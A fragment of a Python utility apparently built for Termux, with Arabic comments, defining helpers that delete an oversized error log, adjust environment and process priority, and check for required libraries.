def clear_cache():
    """تنظيف الملفات المؤقتة وذاكرة التخزين لزيادة سرعة الأداة"""
    try:
        # حذف ملفات تسجيل الأخطاء القديمة إذا كانت كبيرة جداً
        if os.path.exists("engine_errors.log"):
            if os.path.getsize("engine_errors.log") > 1024 * 1024: # 1MB
                os.remove("engine_errors.log")
    except Exception:
        pass

def optimize_terminal():
    """تحسين واجهة Termux لضمان سلاسة عرض العدادات"""
    # إعداد متغيرات البيئة لتقليل استهلاك الرام (RAM)
    os.environ['PYTHONHASHSEED'] = str(random.randint(1, 1000))
    # محاولة رفع كفاءة المعالجة (Priority)
    try:
        if os.name != 'nt':
            os.nice(0)
    except:
        pass

def check_dependencies():
    """التأكد من وجود المكتبات اللازمة لتجنب كراش الأداة"""
    required_libs = ["requests", "rich", "uuid"]
    missing_libs = []
    for lib in required_libs:
        try:
            __import__(lib)
        except ImportError:
            missing_libs.append(lib)
    
    if missing_libs:
        print(f"{R}[!] Missing Libraries: {missing_libs}")
        print(f"{Y}[*] Please run: pip install {' '.join(missing_libs)}")
        sys.exit()

